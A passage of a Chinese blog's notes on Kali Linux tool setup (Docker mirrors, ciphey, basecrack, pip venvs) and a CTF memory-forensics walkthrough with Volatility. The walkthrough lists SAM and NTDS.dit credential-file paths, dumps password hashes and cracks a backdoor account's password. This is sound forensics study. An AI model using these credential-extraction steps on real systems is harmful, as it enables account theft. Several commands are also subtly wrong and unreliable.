<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flatpak update</span><br></pre></td></tr></table></figure>
<p>还失败的话就更新下<code>flatpak</code>。</p>
<h2 id="docker启动失败">docker启动失败</h2>
<blockquote>
<p><a href="https://blog.csdn.net/qq_39779233/article/details/142890967">Docker 拉取镜像时配置可用镜像源（包含国内可用镜像源）_docker镜像源-CSDN博客</a></p>
</blockquote>
<p>类似如下报错：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl status docker.service</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">× docker.service - Docker Application Container Engine</span><br><span class="line">     Loaded: loaded (/usr/lib/systemd/system/docker.service; enabled; preset: enabled)</span><br><span class="line">     Active: failed (Result: exit-code) since Mon 2024-11-11 01:26:48 EST; 4s ago</span><br><span class="line"> Invocation: a94a14824532421fa127a297e3857f2e</span><br><span class="line">TriggeredBy: × docker.socket</span><br><span class="line">       Docs: https://docs.docker.com</span><br><span class="line">    Process: 21309 ExecStart=/usr/sbin/dockerd -H fd:// --containerd=/run/containerd/c&gt;</span><br><span class="line">   Main PID: 21309 (code=exited, status=1/FAILURE)</span><br><span class="line"></span><br><span class="line">Nov 11 01:26:48 kali systemd[1]: docker.service: Scheduled restart job, restart counte&gt;</span><br><span class="line">Nov 11 01:26:48 kali systemd[1]: docker.service: Start request repeated too quickly.</span><br><span class="line">Nov 11 01:26:48 kali systemd[1]: docker.service: Failed with result &#x27;exit-code&#x27;.</span><br><span class="line">Nov 11 01:26:48 kali systemd[1]: Failed to start docker.service - Docker Application C&gt;</span><br></pre></td></tr></table></figure>
<p>报错关键：<code>Result: exit-code</code><br>
主要由于一些配置文件错误导致报错了。</p>
<p>一般就直接针对配置文件进行处理：<code>vi /etc/docker/daemon.json</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;registry-mirrors&quot;: [</span><br><span class="line">        &quot;https://docker.1panel.live&quot;,</span><br><span class="line">        &quot;https://hub.rat.dev&quot;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>修改完毕之后，直接使用<code>systemctl daemon-reload</code>，进行reload.</p>
<p>然后重启docker服务。<code>systemctl restart docker</code></p>
<p>最后查看是否换源成功。<br>
<code>docker info</code></p>
<h1>安装ciphey</h1>
<blockquote>
<p>主要存在的困难点就是镜像源被ban掉了所以导致无法下载。<br>
要么换镜像，要么就是直接挂代理，害。</p>
</blockquote>
<p>在上面的换源操作成功之后，突然可以安装<code>ciphey</code>了，神奇。</p>
<p><code>docker run -it --rm remnux/ciphey</code><br>
没有镜像的话，会自动索引可以下载的镜像源，然后进行安装。<br>
安装完毕之后，就可以直接进行调用了。</p>
<p>一般调用：</p>
<ul>
<li><code>docker run -it --rm remnux/ciphey -t &quot;xxx&quot;</code></li>
<li><code>docker run -it --rm remnux/ciphey -f [filename]</code></li>
</ul>
<h1>安装pwntools</h1>
<blockquote>
<p><a href="https://docs.pwntools.com/en/stable/install.html#python3">https://docs.pwntools.com/en/stable/install.html#python3</a></p>
</blockquote>
<p>包含python3的pwntools的安装。<br>
涉及到<a href="kali-pip3%E5%AE%89%E8%A3%85%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83.md">kali-pip3安装虚拟环境</a>中提升权限的问题。<br>
一般安装不上东西基本都是因为权限太低，或者相关依赖库版本不对应的原因。</p>
<p>python2安装官方方法无法进行安装，暂时无法理解如何进行处理。<br>
先放着。</p>
<h1>安装basecrack</h1>
<p>下载工具：<a href="https://github.com/mufeedvh/basecrack">https://github.com/mufeedvh/basecrack</a><br>
下载好包之后就可以直接进入到目录之后使用<code>pip install -r requirements.txt</code>进行安装。</p>
<p>可能出现问题的主要在跟虚拟环境联合的时候：</p>
<ul>
<li>先进入到虚拟环境</li>
<li>再进入到<code>basecrack</code>的目录之下</li>
<li>使用<code>pip</code>相关命令进行安装</li>
</ul>
<p>具体使用方法见<code>readme.md</code><br>
一般情况下会用<code>python3 basecrack.py -f [filename] -m</code>即可。<br>
基本就能直接使用工具去解密base系列的题目了。</p>
<h1>镜像文件简单分析</h1>
<blockquote>
<p><a href="https://github.com/volatilityfoundation/volatility">GitHub - volatilityfoundation/volatility: An advanced memory forensics framework</a></p>
</blockquote>
<blockquote>
<p>具体的思路需要梳理一下。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">某公司服务器出现了数据泄露，请分析文件回答下列问题</span><br><span class="line"></span><br><span class="line">1、经检查，攻击者利用IPC漏洞监控了服务器，攻击者的IP地址的32位小写md5值即为答案。（如，攻击者ip地址为192.168.1.1，则答案为66efff4c945d3c3b87fc271b47d456db）</span><br><span class="line"></span><br><span class="line">答：2b714710cb93b5eb3295ff8b51819081</span><br><span class="line"></span><br><span class="line">2、攻击者利用服务器内用户命名规则创建了后门账号，请找出该后门账号，该账号的登录密码的32位小写md5值即是答案。（例：密码为123456，则答案为e10adc3949ba59abbe56e057f20f883e）</span><br><span class="line"></span><br><span class="line">答：5e8667a439c68f5145dd2fcbecf02209</span><br><span class="line"></span><br><span class="line">3、攻击者从服务器中窃取了一些个人敏感数据，请分析文件，找到包含的所有身份证信息(共5个)，并按照身份证首位数字从小到大进行排序顺序（首位数字相同则比较第二位数字，以此类推），并以-进行连接，最后计算其32位小写MD5值作为答案（例：身份证1：123456789；身份证2：987654321；身份证3：111111111，则身份证顺序：111111111-123456789-987654321，答案为：1f18992fb75aaa7f34c8b6583fb3ac1e）（注：题目中身份证信息等个人信息为出题需要编写，均为虚假信息，不具备真实性及效益。）</span><br><span class="line"></span><br><span class="line">答：140bc19db32fec044a87d6130eab854f</span><br></pre></td></tr></table></figure>
<h2 id="了解镜像文件使用系统">了解镜像文件使用系统</h2>
<ul>
<li><code>vol.py -f [rawfile] imageinfo</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>基于服务器描述，主要选择的方向就是<code>Win2008</code>系列的，一般情况下，优先考虑相对靠前位置的操作系统。</p>
<h3 id="netscan"><code>netscan</code></h3>
<ul>
<li>查看网络连接</li>
<li>查看当前系统IP</li>
</ul>
<h2 id="IPC漏洞控制服务器">IPC漏洞控制服务器</h2>
<blockquote>
<p>题目中提示信息：攻击者利用IPC漏洞监控了服务器</p>
</blockquote>
<ul>
<li>漏洞利用条件：开放了 139、445 端口和 ipc$ 文件共享，并且我们已经获取到用户登录账号和密码。</li>
<li>主要这个漏洞在WinServer2008中好像比较典型</li>
</ul>
<h2 id="账号相关一般考虑注册表相关信息">账号相关一般考虑注册表相关信息</h2>
<ul>
<li>hivelist</li>
<li>hivedump：查看注册表键名
<ul>
<li>试了一下暂且不能理解为啥需要这种命令，以及放的虚拟地址具体需要查看啥。</li>
</ul>
</li>
<li>printkey</li>
<li>hashdump</li>
</ul>
<h3 id="hivelist"><code>hivelist</code></h3>
<ul>
<li>列出所有的注册表项及其虚拟地址和物理地址</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ntds.dit文件位置: C:\Windows\NTDS\NTDS.dit</span><br><span class="line">system文件位置:C:\Windows\System32\config\SYSTEM</span><br><span class="line">sam文件位置:C:\Windows\System32\config\SAM</span><br><span class="line">#通过SAM数据库获得用户hash的方法</span><br></pre></td></tr></table></figure>
<p>在这一块基本找具体要分析的注册表的路径位置？<br>
找比较可行的路径？<br>
不太理解。</p>
<h3 id="hivedump"><code>hivedump</code></h3>
<ul>
<li>注册表相关信息罗列</li>
</ul>
<p>这边能找到一堆<code>user1</code>等相关账号，相对来说比较可疑。<br>
所以能够定位到<code>\SAM\Domains\Account\Users\Names</code></p>
<h3 id="printkey"><code>printkey</code></h3>
<ul>
<li>
<p><code>vol.py -f data1.raw --profile=Win2008R2SP0x64 printkey -K &quot;SAM\Domains\Account\Users\Names&quot;</code> 主要这边的路径去看具体内容，看不到F值，没法进行对比</p>
</li>
<li>
<p>稍微往上一级去看具体内容</p>
</li>
<li>
<p><code>vol.py -f data1.raw --profile=Win2008R2SP0x64 printkey -K &quot;SAM\Domains\Account\Users&quot;</code> 上一级可以查看目录下的具体参数</p>
</li>
<li>
<p>逐个进行<code>F</code>值的对比，跟<code>Administrator</code>进行对比</p>
</li>
<li>
<p><code>vol.py -f data1.raw --profile=Win2008R2SP0x64 printkey -K &quot;SAM\Domains\Account\Users\000001F4&quot;</code>，Administrator</p>
</li>
<li>
<p><code>vol.py -f data1.raw --profile=Win2008R2SP0x64 printkey -K &quot;SAM\Domains\Account\Users\000003F1&quot;</code>，user7</p>
</li>
<li>
<p>两者经过对比发现<code>F</code>值比较类似，所以高权限的后门账号是<code>user7</code></p>
</li>
<li>
<p><strong>补充</strong>：<code>printkey -K &quot;ControlSet001\Control\ComputerName\ComputerName&quot;</code>获取主机名</p>
</li>
</ul>
<h3 id="hashdump"><code>hashdump</code></h3>
<blockquote>
<p><a href="https://hello-ctf.com/HC_MISC/memory/#mimikatz">https://hello-ctf.com/HC_MISC/memory/#mimikatz</a><br>
<a href="https://wiki.wgpsec.org/knowledge/ctf/Volatility.html">【MISC】Volatility取证分析工具 | 狼组安全团队公开知识库</a></p>
</blockquote>
<ul>
<li><code>vol.py -f data1.raw --profile=Win2008R2SP0x64 hashdump</code></li>
<li>直接定位<code>user7</code>找到哈希值，然后上在线网站进行反向查找得到</li>
<li><code>87654321</code></li>
</ul>
<h2 id="文件相关主要考虑利用可疑进程把数据dump下来">文件相关主要考虑利用可疑进程把数据dump下来</h2>
<ul>
<li>pstree/pslist</li>
<li>memdump</li>
<li>editbox</li>
<li>filescan</li>
<li>dumpfile</li>
</ul>
<h3 id="pstree-pslist"><code>pstree/pslist</code></h3>
<ul>
<li><code>vol.py -f data1.raw --profile=Win2008R2SP0x64 pstree</code>，存在以下可疑进程
<ul>
<li><code>notepad.exe</code>：txt</li>
<li><code>et.exe</code>：xlsx/xls</li>
<li><code>mspaint.exe</code>：原始数据<code>.data</code>型</li>
</ul>
</li>
</ul>
<h3 id="memdump"><code>memdump</code></h3>
<ul>
<li><code>vol.py -f data1.raw --profile=Win2008R2SP0x64 memdump -p 952 -D vol_output</code></li>
<li>得到的dmp文件修改后缀名为<code>.data</code></li>
<li>使用<code>gimp</code>进行读取查看</li>
<li>一般查看图片思路：<code>height</code>先确定，<code>offset</code>先找到大概有字符的部分，然后调整<code>width</code>使得图片正常显示</li>
<li>得到<code>513701199912314701</code></li>
</ul>
<h3 id="editbox"><code>editbox</code></h3>
<ul>
<li><code>vol.py -f data1.raw --profile=Win2008R2SP0x64 editbox</code><br>
直接能看到txt文件里面的内容。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">张三    13528790688     430512198908131367</span><br><span class="line">李四    18234924149     310115199110257136</span><br></pre></td></tr></table></figure>
<h3 id="filescan"><code>filescan</code></h3>
<ul>
<li>通过<code>grep</code>辅助查找关键文件类型</li>
<li><code>vol.py -f data1.raw --profile=Win2008R2SP0x64 filescan | grep -E '|.txt|.xls|.xlsx' </code></li>
<li>但显示的有点奇奇怪怪的，找到关键文件之后结合<code>dumpfile</code>进行提取</li>
</ul>
<h3 id="dumpfile"><code>dumpfile</code></h3>
<ul>
<li>导出某一文件(指定虚拟地址)</li>
<li><code>vol.py -f data1.raw --profile=Win2008R2SP0x64 dumpfiles -Q 0x000000007eddf750 --dump-dir=vol_output</code></li>
<li>或者<code>--dump-dir=</code>用<code>-D </code>替代</li>
<li>导出来的一般是<code>.dat</code>的文件，可以使用<code>foremost</code>进行查看</li>
<li>不过由于格式特殊性，一般情况下，<code>.xlsx</code>文件容易被识别成<code>.zip</code>，需要简单查看内容有没有缺失，然后修改后缀名为<code>.xlsx</code></li>
</ul>
<p>查看<code>xlsx</code>里面的内容，可以得到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">|客户姓名|身份证|</span><br><span class="line">|张伟|652901196611026716|</span><br><span class="line">|李星怡|123456202001011236|</span><br></pre></td></tr></table></figure>
<p>然后按照要求进行拼接。</p>
<p>后面主要涉及结合<code>gimp</code>去dump出来的图片。</p>
]]></content>
      <categories>
        <category>Configuration</category>
      </categories>
      <tags>
        <tag>basecrack</tag>
        <tag>gimp</tag>
        <tag>ciphey</tag>
        <tag>pwntools</tag>
        <tag>volatility</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali-Pip3安装虚拟环境</title>
    <url>/2024/12/05/kali-pip3%E5%AE%89%E8%A3%85%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<p><code>kali-2024</code>版本，搭建python3的虚拟环境，在虚拟环境中可以直接调用<code>pip3</code>，否则在本地环境不太好用。</p>
<p>体感虚拟环境除了个要进入到虚拟环境这个操作，其他倒是和之前无虚拟环境用法一致。</p>
<span id="more"></span><!--toc-->
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error: externally-managed-environment</span><br><span class="line"></span><br><span class="line">× This environment is externally managed</span><br><span class="line">╰─&gt; To install Python packages system-wide, try apt install</span><br><span class="line">    python3-xyz, where xyz is the package you are trying to</span><br><span class="line">    install.</span><br><span class="line">    </span><br><span class="line">    If you wish to install a non-Kali-packaged Python package,</span><br><span class="line">    create a virtual environment using python3 -m venv path/to/venv.</span><br><span class="line">    Then use path/to/venv/bin/python and path/to/venv/bin/pip. Make</span><br><span class="line">    sure you have pypy3-venv installed.</span><br><span class="line">    </span><br><span class="line">    If you wish to install a non-Kali-packaged Python application,</span><br><span class="line">    it may be easiest to use pipx install xyz, which will manage a</span><br><span class="line">    virtual environment for you. Make sure you have pipx installed.</span><br><span class="line">    </span><br><span class="line">    For more information, refer to the following:</span><br><span class="line">    * https://www.kali.org/blog/python-externally-managed/</span><br><span class="line">    * /usr/share/doc/python3.12/README.venv</span><br><span class="line"></span><br><span class="line">note: If you believe this is a mistake, please contact your Python installation or OS distribution provider. You can override this, at the risk of breaking your Python installation or OS, by passing --break-system-packages.</span><br><span class="line">hint: See PEP 668 for the detailed specification.</span><br><span class="line"># </span><br></pre></td></tr></table></figure>
<p>报错原因如上。<br>
总之是为了避免冲突所以进行了限制。</p>
<h1>1. 创建虚拟环境</h1>
<p>创建一个虚拟环境，在该虚拟环境中可以自由使用<code>pip</code>进行相关库的安装而不影响系统级别的Python环境。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install python3-env</span><br><span class="line">python3 -venv [虚拟环境名称]</span><br></pre></td></tr></table></figure>
<p>激活虚拟环境</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">source</span> [虚拟环境名称]/bin/activate</span><br></pre></td></tr></table></figure>
<p>进入到虚拟环境进行安装库</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install [库名]</span><br></pre></td></tr></table></figure>
<p>退出虚拟环境</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">deactivate</span><br></pre></td></tr></table></figure>
<h1>2. 使用pipx安装应用程序</h1>
<blockquote>
<p>理论上，本身自己没有进行安装测试。</p>
</blockquote>
<p>安装命令行工具或者应用程序，希望全局可用，但不希望干扰到系统的python环境，可以使用<code>pipx</code>，首先安装一个<code>pipx</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install pipx</span><br><span class="line">pipx ensurepath</span><br><span class="line">pipx install [库名]</span><br></pre></td></tr></table></figure>
<h1>虚拟环境如何提高权限</h1>
<p>安装相关库的时候，往往需要高权限才能进行相关库的安装。</p>
<ul>
<li>先进入管理员权限</li>
<li>然后使用<code>source []/bin/activate</code>进入到搭建的虚拟环境中</li>
</ul>
]]></content>
      <categories>
        <category>Configuration</category>
      </categories>
      <tags>
        <tag>kali2024</tag>
        <tag>pip3</tag>
        <tag>virtual</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali-Pip2安装</title>
    <url>/2024/12/05/kali-pip2%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<p><code>kali-2024</code>版本，pip2安装。</p>
<span id="more"></span><!--toc-->
<h1>1. 安装setup-tools18.5</h1>
<p>下载文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://pypi.python.org/packages/source/s/setuptools/setuptools-18.5.tar.gz </span><br><span class="line"><span class="comment"># 建议直接本地机下载东西然后传进去</span></span><br></pre></td></tr></table></figure>
<p>然后进行解压缩</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar -zxvf setuptools-18.5.tar.gz  </span><br><span class="line"><span class="built_in">cd</span> setuptools-18.5/</span><br><span class="line"><span class="comment"># 最好在非管理员权限之下进行下载</span></span><br></pre></td></tr></table></figure>
<p>root权限之下安装相关依赖</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo python2 setup.py build</span><br><span class="line">sudo python2 setup.py install</span><br></pre></td></tr></table></figure>
<h1>2.  安装pip2</h1>
<p><a href="http://xn--2-zb2b494k.xn--7pip-bl7j.py">安装2.7的pip.py</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://bootstrap.pypa.io/pip/2.7/get-pip.py</span><br><span class="line"><span class="comment"># 建议直接本地机下载东西然后传进去</span></span><br></pre></td></tr></table></figure>
<p>直接运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo python2 get-pip.py</span><br></pre></td></tr></table></figure>
<h1>3. 测试pip2</h1>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip2 --version</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Configuration</category>
      </categories>
      <tags>
        <tag>kali2024</tag>
        <tag>pip2</tag>
      </tags>
  </entry>
</search>
